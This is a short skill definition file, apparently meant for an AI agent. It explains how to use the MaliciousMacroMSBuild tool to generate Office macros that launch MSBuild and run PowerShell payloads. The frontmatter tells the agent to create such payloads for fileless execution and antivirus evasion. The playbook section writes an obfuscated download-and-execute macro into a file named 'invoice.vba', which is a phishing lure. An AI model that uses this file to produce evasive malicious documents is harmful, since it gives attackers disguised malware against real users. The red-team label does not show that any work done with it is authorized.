---
name: m3-gen-msbuild
description: "MaliciousMacroMSBuild: Fileless evasion via macros embedding MSBuild. Signals: fileless attack, lolbins, macro+MSBuild generation, PS payload, obfuscation."
zh-signals: "MaliciousMacroMSBuild: 宏内嵌 MSBuild 免杀。信号:无文件攻击,lolbins,宏+MSBuild 生成,PS 载荷,混淆。"
when-to-use: "Use to generate macro-embedded MSBuild payloads for fileless execution and evasion during red-team operations."
---

# MaliciousMacroMSBuild

- Attack Category: C23 Fileless Attacks and LOLBins Abuse
- Upstream Repository: https://github.com/infosecn1nja/MaliciousMacroMSBuild
- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/infosecn1nja/MaliciousMacroMSBuild
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 m3-gen.py -p 'cmd /c whoami' -o macro.vba` | Macro + MSBuild generation |
| `-p powershell -o out.vba` | PowerShell payload |
| `-e` | Obfuscation |

## Attack Scenario Playbook

### Macro-embedded MSBuild for AV evasion

```bash
python3 m3-gen.py -p 'IEX(download)' -o invoice.vba
# Execute filelessly from inside the document
```

## Notes

From infosecn1nja; combined macro + MSBuild payload.
